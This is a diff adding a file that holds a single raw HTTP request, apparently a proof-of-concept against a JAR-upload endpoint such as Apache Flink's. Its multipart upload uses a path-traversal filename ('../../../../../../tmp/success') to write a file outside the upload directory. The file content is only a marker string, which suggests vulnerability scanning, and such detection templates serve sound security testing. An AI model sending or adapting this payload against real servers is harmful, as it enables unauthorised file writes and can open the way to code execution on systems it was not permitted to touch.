@@ -1,0 +1,16 @@
+POST /jars/upload HTTP/1.1
+Host: 10.10.3.128
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+Connection: close
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y
+Content-Length: 187
+
+
+------WebKitFormBoundaryoZ8meKnrrso89R6Y
+Content-Disposition: form-data; name="jarfile"; filename="../../../../../../tmp/success"
+
+success
+------WebKitFormBoundaryoZ8meKnrrso89R6Y--
